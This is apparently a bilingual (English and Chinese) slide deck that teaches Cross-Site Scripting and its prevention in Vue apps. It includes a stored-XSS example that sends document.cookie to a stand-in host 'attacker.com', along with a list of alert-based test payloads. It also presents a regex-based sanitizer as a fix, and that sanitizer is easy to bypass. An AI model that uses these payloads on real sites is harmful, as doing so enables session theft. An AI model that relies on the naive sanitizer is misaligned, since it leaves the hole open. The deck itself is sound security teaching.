---
theme: seriph
background: https://images.unsplash.com/photo-1687817678673-f01e050419fe?q=80&w=2071&auto=format&fit=crop&ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D
class: 'text-center'
highlighter: shiki
lineNumbers: true
info: |
  ## Cross-Site Scripting (XSS)
  A comprehensive guide to understanding and preventing XSS attacks.
drawings:
  persist: false
css: unocss
---

# Cross-Site Scripting (XSS)
<!-- ## Understanding and Preventing Web Security Vulnerabilities -->

---

# What is XSS?

Cross-Site Scripting (XSS) is a security vulnerability that allows attackers to:

- 💉 Inject malicious scripts into web pages
- 🔍 Steal sensitive user data
- 🎭 Impersonate users
- 🛠 Modify webpage content
- 🔗 Redirect users to malicious sites

<!-- <div class="mt-8">

```html {all|2|all}
<input value="hello">
<input value="hello"><script>alert('hacked!')</script>">
```

</div> -->

---

# Reflected XSS
- 攻擊程式碼從請求 URL 傳入，URL 參數直接顯示在頁面

<div class="mt-4">
```html {1|3|5}
<p>你搜尋的是：<strong><?= $_GET['query'] ?></strong></p>

http://example.com/search?query=<script>alert('xss')

<p>你搜尋的是：<strong><script>alert('xss')</script></strong></p>
```
</div>

<img
  v-click
  class="contain h-50 mt-4"
  src="/reflected-xss.png"
  alt=""
/>

---

# Stored XSS

- 攻擊程式碼儲存在伺服器端
- 任何訪問頁面的使用者都會受影響
- 常見於留言板、評論、文章發布等

<div class="mt-4">
```html {1|2-4}
// 攻擊者提交惡意留言
<script>
  fetch('http://attacker.com/steal?cookie=' + document.cookie)
</script>

```
</div>


---

# DOM-based XSS

- 發生在 client-side JavaScript 執行過程中
- 攻擊者無需伺服器端儲存惡意程式碼
- 在 DOM 中直接操作和執行

<div class="mt-4">
```html {1-2,4|6-16|all}
<div id="output"></div>
<input type="text" id="userInput">
    
<button onclick="displayMessage()">Submit</button>

<script>
  function displayMessage() {
    const input = document.getElementById('userInput');
    const outputDiv = document.getElementById('output');

    outputDiv.innerHTML = input.value;
  }


</script>

// 惡意輸入範例：
  // <script>alert('XSS Attack!');</script>
```
</div>

---

# DOM-based XSS Test Case

```js
// Basic XSS test
<script>alert('XSS')</script>

// Image with onerror
<img src=x onerror="alert('Hacked!')">

// JavaScript URI
javascript:alert('XSS')

// Event handlers
<body onload=alert('XSS')>
```

---

# V-HTML XSS Attack
```html {all}
<script>alert('Hacked!');</script>

```
<div class="flex justify-center mt-6">
<img
  class="contain h-80"
  src="/script_html.gif"
  alt=""
/>
</div>

---

# V-HTML XSS Attack
```html {all}
<img src=x onerror="alert('Hacked!')">

```
<div class="flex justify-center mt-6">
<img
  class="contain h-80"
  src="/img_html.gif"
  alt=""
/>
</div>

---

# Security Fix

```ts {13-23|1-11}
function escapeHTML(str: string): string {
  const escapeChars: { [key: string]: string } = {
    '&': '&amp;',
    '<': '&lt;',
    '>': '&gt;',
    '"': '&quot;',
    '\'': '&#x27;',
    '/': '&#x2F;'
  };
  return str.replace(/[&<>"'/]/g, (char) => escapeChars[char]);
}

function sanitizeHTML(input: string): string {
  let sanitized: string = input.replace(/<(script|iframe|object|embed|style)[^>]*>[\s\S]*?<\/\1>/gi, '');

  sanitized = sanitized.replace(/\s+(on\w+)="[^"]*"/gi, '');

  sanitized = sanitized.replace(/javascript:/gi, '');

  sanitized = escapeHTML(sanitized);

  return sanitized;
}
```

---

# Security Fix
````md magic-move {lines: true}
```html
<!-- MessagePreviewCard.vue -->
<div
  v-linkified
  v-html="temp.content"
/>

<!-- TemplatePreview.vue -->
<script>
headerText.replace(`{{${1}}}`, `<span>${header.params}</span>`);
</script>
```

```html
<!-- MessagePreviewCard.vue -->
<div
  v-linkified
  v-html="sanitizeHTML(temp.content)"
/>

<!-- TemplatePreview.vue -->
<script>
  const sanitizeHeaderParams = sanitizeHTML(header.params);
  headerText.replace(`{{${1}}}`, `<span>${sanitizeHeaderParams}</span>`);
</script>
```
````

---

# Security Fix
```html {all}
<script>alert('Hacked!');</script>

```
<div class="flex justify-center mt-6">
<img
  class="contain h-80"
  src="/script_fix.png"
  alt=""
/>
</div>

---

# Security Fix
```html {all}
<img src=x onerror="alert('Hacked!')">

```
<div class="flex justify-center mt-6">
<img
  class="contain h-80"
  src="/img_fix.png"
  alt=""
/>
</div>

---

# Asgard / Niffler

- Default Reply Preview
- WhatsApp Template Preview
- WhatsApp flow Preview


---

# DOMPurify


```html{all|2,7,12}
<script>
import DOMPurify from 'dompurify';

export default {
  data() {
    return {
      userInput: '<script>alert("XSS!")</script><p>安全的內容</p>',
    };
  },
  computed: {
    sanitizedContent() {
      return DOMPurify.sanitize(this.userInput);
    },
  },
};
</script>

```

---

# vue-dompurify-html


```js {all|1,4,7,10-13}
// main.js
import { createApp } from 'vue';
import App from './App.vue';
import VueDOMPurifyHTML from 'vue-dompurify-html';

const app = createApp(App);
app.use(VueDOMPurifyHTML);
app.mount('#app');

// component.vue
<template>
    <div v-dompurify-html="rawHtml"></div>
</template>

```

---
layout: center
class: text-center
---

# Stay Secure!

[OWASP XSS Prevention](https://owasp.org/www-community/attacks/xss/) · [MDN Web Security](https://developer.mozilla.org/en-US/docs/Web/Security)

Remember: Security is a continuous process, not a one-time task.


